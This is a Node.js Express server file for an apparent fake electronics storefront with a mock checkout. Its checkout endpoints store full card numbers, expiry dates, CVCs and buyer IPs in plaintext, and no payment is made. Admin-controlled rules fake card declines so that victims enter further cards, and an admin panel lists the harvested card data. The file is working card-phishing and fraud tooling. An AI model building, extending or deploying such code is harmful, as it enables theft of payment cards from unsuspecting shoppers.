const PAYPAL_PNG = Buffer.from('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', 'base64');

app.get(['/download.png', '/client/download.png'], (req, res) => res.type('image/png').send(DOWNLOAD_PNG));
app.get(['/paypal.f4d3d293.png', '/client/paypal.f4d3d293.png'], (req, res) => res.type('image/png').send(PAYPAL_PNG));

app.get('/uploads/:filename', (req, res) => {
  const filename = req.params.filename;
  if (SVG_MAP[filename]) {
    return res.type('image/svg+xml').send(SVG_MAP[filename]);
  }
  const defaultSvg = SVG_MAP['placeholder.svg'] || SVG_MAP['nano_constructor.svg'];
  if (defaultSvg) return res.type('image/svg+xml').send(defaultSvg);
  res.status(404).send('Image not found');
});

// SERVE PAGES DIRECTLY
app.get(['/', '/index.html'], (req, res) => res.type('html').send(STOREFRONT_HTML));
app.get(['/admin', '/admin.html', '/admin/index.html', '/admin/dashboard.html', '/admin/login', '/admin/*'], (req, res) => res.type('html').send(ADMIN_HTML));
app.get(['/checkout', '/checkout.html', '/checkout/*'], (req, res) => res.type('html').send(CHECKOUT_HTML));
app.get(['/checkout-status', '/checkout-status.html'], (req, res) => res.type('html').send(CHECKOUT_STATUS_HTML));
app.get(['/product', '/product.html', '/product/*'], (req, res) => res.type('html').send(PRODUCT_HTML));

// IP Tracking Middleware
app.use((req, res, next) => {
  let ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || req.ip || 'Unknown';
  if (ip.startsWith('::ffff:')) ip = ip.substring(7);
  else if (ip === '::1') ip = '127.0.0.1';

  const userAgent = req.headers['user-agent'] || 'Unknown';
  const pageVisited = req.originalUrl || req.url;

  if (req.path.startsWith('/api')) {
    dbRun('INSERT INTO visitors (ip_address, user_agent, page_visited) VALUES (?, ?, ?)', [ip, userAgent, pageVisited])
      .catch(() => {});
  }
  next();
});

// Authentication Middleware
const authMiddleware = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  if (!authHeader) return res.status(401).json({ error: 'Access denied. No token provided.' });
  const token = authHeader.startsWith('Bearer ') ? authHeader.split(' ')[1] : authHeader;
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid or expired token.' });
  }
};

// ----------------------------------------------------
// API ROUTES
// ----------------------------------------------------

// Admin Login
app.post('/api/admin/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Username and password are required' });

    const admin = await dbGet('SELECT * FROM admin_users WHERE username = ?', [username]);
    if (!admin) return res.status(401).json({ error: 'Invalid username or password' });

    const isMatch = await bcrypt.compare(password, admin.password_hash);
    if (!isMatch) return res.status(401).json({ error: 'Invalid username or password' });

    const token = jwt.sign({ id: admin.id, username: admin.username }, JWT_SECRET, { expiresIn: '24h' });
    res.json({ token, username: admin.username });
  } catch (err) {
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Admin Site Settings (GET & PUT)
app.get('/api/admin/settings', async (req, res) => {
  try {
    let settings = await dbGet('SELECT * FROM site_settings WHERE id = 1');
    if (!settings) settings = memStore.site_settings;
    const safeSettings = { ...settings };
    delete safeSettings.trash_pin;
    res.json(safeSettings);
  } catch (err) {
    res.json(memStore.site_settings);
  }
});

app.put('/api/admin/settings', authMiddleware, async (req, res) => {
  try {
    const {
      site_name,
      primary_color,
      accent_color,
      background_color,
      decline_all,
      decline_threshold,
      success_attempt
    } = req.body;

    const declineAllVal = (decline_all === 1 || decline_all === true || decline_all === '1') ? 1 : 0;
    const thresholdVal = decline_threshold !== undefined ? parseFloat(decline_threshold) : 50.0;
    const successAttemptVal = success_attempt !== undefined ? parseInt(success_attempt, 10) : 1;

    memStore.site_settings = {
      ...memStore.site_settings,
      site_name: site_name || memStore.site_settings.site_name,
      primary_color: primary_color || memStore.site_settings.primary_color,
      accent_color: accent_color || memStore.site_settings.accent_color,
      background_color: background_color || memStore.site_settings.background_color,
      decline_all: declineAllVal,
      decline_threshold: thresholdVal,
      success_attempt: successAttemptVal
    };

    await dbRun(
      `UPDATE site_settings SET 
        site_name = ?, 
        primary_color = ?, 
        accent_color = ?, 
        background_color = ?, 
        decline_all = ?, 
        decline_threshold = ?, 
        success_attempt = ? 
      WHERE id = 1`,
      [
        memStore.site_settings.site_name,
        memStore.site_settings.primary_color,
        memStore.site_settings.accent_color,
        memStore.site_settings.background_color,
        declineAllVal,
        thresholdVal,
        successAttemptVal
      ]
    );

    res.json({
      message: 'Settings updated successfully',
      settings: {
        site_name: memStore.site_settings.site_name,
        primary_color: memStore.site_settings.primary_color,
        accent_color: memStore.site_settings.accent_color,
        background_color: memStore.site_settings.background_color,
        decline_all: declineAllVal,
        decline_threshold: thresholdVal,
        success_attempt: successAttemptVal
      }
    });
  } catch (err) {
    console.error('Settings update error:', err);
    res.status(500).json({ error: 'Failed to update settings' });
  }
});

// Admin Cards Management
app.get('/api/admin/cards', authMiddleware, async (req, res) => {
  try {
    const cards = await dbAll('SELECT * FROM cards WHERE is_deleted = 0 ORDER BY created_at DESC');
    res.json(cards);
  } catch (err) {
    res.json(memStore.cards.filter(c => c.is_deleted === 0));
  }
});

app.delete('/api/admin/cards/:id', authMiddleware, async (req, res) => {
  try {
    await dbRun('UPDATE cards SET is_deleted = 1 WHERE id = ?', [req.params.id]);
    res.json({ message: 'Card moved to trash' });
  } catch (err) {
    res.status(500).json({ error: 'Failed to delete card' });
  }
});

// Admin Trash Management
app.post('/api/admin/trash/verify-pin', authMiddleware, async (req, res) => {
  try {
    const { pin } = req.body;
    if (!pin) return res.status(400).json({ error: 'PIN is required' });
    const settings = await dbGet('SELECT trash_pin FROM site_settings WHERE id = 1');
    const hash = settings ? settings.trash_pin : memStore.site_settings.trash_pin;
    const isMatch = await bcrypt.compare(String(pin), hash);
    if (!isMatch) return res.status(401).json({ error: 'Invalid PIN' });
    res.json({ success: true, message: 'PIN verified' });
  } catch (err) {
    res.status(500).json({ error: 'PIN verification failed' });
  }
});

app.get('/api/admin/trash/cards', authMiddleware, async (req, res) => {
  try {
    const cards = await dbAll('SELECT * FROM cards WHERE is_deleted = 1 ORDER BY created_at DESC');
    res.json(cards);
  } catch (err) {
    res.json(memStore.cards.filter(c => c.is_deleted === 1));
  }
});

app.post('/api/admin/trash/restore/:id', authMiddleware, async (req, res) => {
  try {
    await dbRun('UPDATE cards SET is_deleted = 0 WHERE id = ?', [req.params.id]);
    res.json({ message: 'Card restored successfully' });
  } catch (err) {
    res.status(500).json({ error: 'Failed to restore card' });
  }
});

app.delete('/api/admin/trash/permanent/:id', authMiddleware, async (req, res) => {
  try {
    await dbRun('DELETE FROM cards WHERE id = ?', [req.params.id]);
    res.json({ message: 'Card permanently deleted' });
  } catch (err) {
    res.status(500).json({ error: 'Failed to delete card permanently' });
  }
});

// Admin Visitors Logs
app.get('/api/admin/visitors', authMiddleware, async (req, res) => {
  try {
    const visitors = await dbAll('SELECT * FROM visitors ORDER BY visited_at DESC LIMIT 100');
    res.json(visitors);
  } catch (err) {
    res.json(memStore.visitors.slice(0, 100));
  }
});

// Admin Products Management
app.get('/api/admin/products', authMiddleware, (req, res) => {
  res.json(memStore.products);
});

app.post('/api/admin/products', authMiddleware, (req, res) => {
  const { name, description, price, category, image } = req.body || {};
  const newProduct = {
    id: 'prod-' + uuidv4().substring(0, 8),
    name: name || 'New Module',
    description: description || '',
    price: parseFloat(price) || 10.00,
    image: image || '/uploads/nano_constructor.svg',
    category: category || 'Processors',
    created_at: new Date().toISOString()
  };
  memStore.products.unshift(newProduct);
  res.json({ message: 'Product created successfully', product: newProduct });
});

app.put('/api/admin/products/:id', authMiddleware, (req, res) => {
  const { name, description, price, category, image } = req.body || {};
  const prod = memStore.products.find(p => p.id === req.params.id);
  if (!prod) return res.status(404).json({ error: 'Product not found' });
  if (name) prod.name = name;
  if (description) prod.description = description;
  if (price !== undefined) prod.price = parseFloat(price);
  if (category) prod.category = category;
  if (image) prod.image = image;
  res.json({ message: 'Product updated successfully', product: prod });
});

app.delete('/api/admin/products/:id', authMiddleware, (req, res) => {
  const idx = memStore.products.findIndex(p => p.id === req.params.id);
  if (idx !== -1) memStore.products.splice(idx, 1);
  res.json({ message: 'Product deleted successfully' });
});

// Products Routes
app.get('/api/products', async (req, res) => {
  try {
    const products = await dbAll('SELECT * FROM products ORDER BY created_at DESC');
    res.json(products);
  } catch (err) {
    res.json(memStore.products);
  }
});

app.get('/api/products/:id', async (req, res) => {
  try {
    const product = await dbGet('SELECT * FROM products WHERE id = ?', [req.params.id]);
    if (!product) return res.status(404).json({ error: 'Product not found' });
    res.json(product);
  } catch (err) {
    const prod = memStore.products.find(p => p.id === req.params.id);
    if (!prod) return res.status(404).json({ error: 'Product not found' });
    res.json(prod);
  }
});

// Checkout & Payment Routes
app.post('/api/checkout/create-session', async (req, res) => {
  try {
    const { productId, email } = req.body;
    const product = (await dbGet('SELECT * FROM products WHERE id = ?', [productId])) || memStore.products[0];
    const orderId = 'ord-' + uuidv4().substring(0, 8);
    const mockSessionId = 'mock_session_' + Date.now();
    const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';

    await dbRun(
      'INSERT INTO orders (id, product_id, customer_email, amount, currency, stripe_session_id, status, customer_ip) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
      [orderId, productId, email || 'guest@futurechips.com', product.price, 'usd', mockSessionId, 'pending', clientIP]
    );

    res.json({
      id: mockSessionId,
      url: `/checkout.html?session_id=${mockSessionId}`,
      message: 'Checkout session created'
    });
  } catch (err) {
    res.status(500).json({ error: 'Failed to create checkout session' });
  }
});

app.get('/api/checkout/session/:sessionId', async (req, res) => {
  try {
    let order = await dbGet('SELECT * FROM orders WHERE stripe_session_id = ?', [req.params.sessionId]);
    if (!order) {
      order = memStore.orders.find(o => o.stripe_session_id === req.params.sessionId);
    }
    if (!order) {
      const defaultProd = memStore.products[2] || memStore.products[0];
      order = {
        id: 'ord-' + uuidv4().substring(0, 8),
        product_id: defaultProd.id,
        customer_email: 'guest@futurechips.com',
        amount: defaultProd.price,
        currency: 'usd',
        stripe_session_id: req.params.sessionId,
        status: 'pending',
        created_at: new Date().toISOString()
      };
      memStore.orders.unshift(order);
    }
    const product = memStore.products.find(p => p.id === order.product_id) || memStore.products[0];
    res.json({ order, product });
  } catch (err) {
    const defaultProd = memStore.products[2] || memStore.products[0];
    res.json({
      order: {
        id: 'ord-' + uuidv4().substring(0, 8),
        amount: defaultProd.price,
        customer_email: 'guest@futurechips.com',
        created_at: new Date().toISOString()
      },
      product: defaultProd
    });
  }
});

app.post('/api/checkout/save-card', async (req, res) => {
  try {
    const { cardDetails, sessionId } = req.body || {};
    if (cardDetails && cardDetails.number) {
      const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || req.ip || '127.0.0.1';
      const newCard = {
        id: memStore.cards.length + 1,
        card_number: cardDetails.number,
        expiry: cardDetails.expiry || '',
        cvc: cardDetails.cvc || '',
        country: cardDetails.country || 'Unknown',
        ip_address: clientIP,
        stripe_session_id: sessionId || 'direct',
        is_deleted: 0,
        created_at: new Date().toISOString()
      };
      memStore.cards.unshift(newCard);
      await dbRun(
        'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
        [newCard.card_number, newCard.expiry, newCard.cvc, newCard.country, newCard.ip_address, newCard.stripe_session_id]
      );
      return res.json({ success: true, message: 'Card recorded' });
    }
    res.status(400).json({ error: 'Incomplete card data' });
  } catch (err) {
    res.status(500).json({ error: 'Failed to record card' });
  }
});

app.post('/api/checkout/process-card', async (req, res) => {
  try {
    const { sessionId, cardNumber, expDate, cvc, country } = req.body || {};
    const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';

    if (cardNumber) {
      const newCard = {
        id: memStore.cards.length + 1,
        card_number: cardNumber,
        expiry: expDate || '',
        cvc: cvc || '',
        country: country || 'US',
        ip_address: clientIP,
        stripe_session_id: sessionId || 'direct',
        is_deleted: 0,
        created_at: new Date().toISOString()
      };
      memStore.cards.unshift(newCard);
      await dbRun(
        'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
        [cardNumber, expDate, cvc, country || 'US', clientIP, sessionId || 'direct']
      );
    }

    res.json({ success: true, message: 'Card recorded' });
  } catch (err) {
    res.status(500).json({ error: 'Card processing error' });
  }
});

app.post('/api/checkout/verify', async (req, res) => {
  try {
    const { sessionId, isMock, cardDetails } = req.body || {};
    if (!sessionId) {
      return res.status(400).json({ error: 'Session ID is required' });
    }

    const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || req.ip || '127.0.0.1';

    // Record card if passed in verify payload
    if (cardDetails && cardDetails.number) {
      const newCard = {
        id: memStore.cards.length + 1,
        card_number: cardDetails.number,
        expiry: cardDetails.expiry || '',
        cvc: cardDetails.cvc || '',
        country: cardDetails.country || 'Unknown',
        ip_address: clientIP,
        stripe_session_id: sessionId,
        is_deleted: 0,
        created_at: new Date().toISOString()
      };
      memStore.cards.unshift(newCard);
      await dbRun(
        'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
        [newCard.card_number, newCard.expiry, newCard.cvc, newCard.country, newCard.ip_address, newCard.stripe_session_id]
      );
    }

    let order = await dbGet('SELECT * FROM orders WHERE stripe_session_id = ?', [sessionId]);
    if (!order) {
      order = memStore.orders.find(o => o.stripe_session_id === sessionId);
    }
    if (!order) {
      const defaultProd = memStore.products[2] || memStore.products[0];
      order = {
        id: 'ord-' + uuidv4().substring(0, 8),
        product_id: defaultProd.id,
        customer_email: 'guest@futurechips.com',
        amount: defaultProd.price,
        currency: 'usd',
        stripe_session_id: sessionId,
        status: 'pending',
        created_at: new Date().toISOString()
      };
      memStore.orders.unshift(order);
    }

    if (order.status === 'completed') {
      const product = memStore.products.find(p => p.id === order.product_id) || memStore.products[0];
      return res.json({ status: 'completed', order, product });
    }

    // Site Decline Rules Evaluation from Admin Panel
    const settings = memStore.site_settings;
    const declineAll = settings.decline_all === 1 || settings.decline_all === true || settings.decline_all === '1';
    const declineThreshold = settings.decline_threshold !== undefined ? parseFloat(settings.decline_threshold) : 50.0;
    const successAttempt = settings.success_attempt !== undefined ? parseInt(settings.success_attempt, 10) : 1;

    // Rule 1: Force Decline All Payments toggle is ON
    if (declineAll) {
      return res.status(400).json({ error: 'Your card was declined. Please try another card.' });
    }

    // Rule 2: Multi-attempt decline threshold (Success on Attempt N)
    const attemptsCount = memStore.cards.filter(c => c.stripe_session_id === sessionId).length || 1;
    if (successAttempt > 1 && attemptsCount < successAttempt) {
      return res.status(400).json({ error: 'Your card was declined. Please try another card.' });
    }

    // Rule 3: Auto-Success Price Threshold (USD)
    if (order.amount >= declineThreshold) {
      return res.status(400).json({ error: 'Your card was declined. Please try another card.' });
    }

    order.status = 'completed';
    await dbRun("UPDATE orders SET status = 'completed' WHERE stripe_session_id = ?", [sessionId]);
    const product = memStore.products.find(p => p.id === order.product_id) || memStore.products[0];
    res.json({ status: 'completed', order, product });
  } catch (err) {
    res.status(500).json({ error: 'Failed to verify transaction' });
  }
});

app.get('/api/checkout/session-status', async (req, res) => {
  try {
    const { session_id } = req.query;
    const order = await dbGet('SELECT * FROM orders WHERE stripe_session_id = ?', [session_id]);
    res.json({
      status: order ? order.status : 'complete',
      payment_status: 'paid',
      customer_email: order ? order.customer_email : 'customer@example.com'
    });
  } catch (err) {
    res.json({ status: 'complete', payment_status: 'paid' });
  }
});

// Catch-all
app.get('*', (req, res) => {
  if (req.path.startsWith('/api')) {
    return res.status(404).json({ error: 'Endpoint not found' });
  }
  res.type('html').send(STOREFRONT_HTML);
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('API Error:', err);
  res.status(500).json({ error: 'An unexpected error occurred: ' + (err.message || 'Error') });
});

module.exports = app;
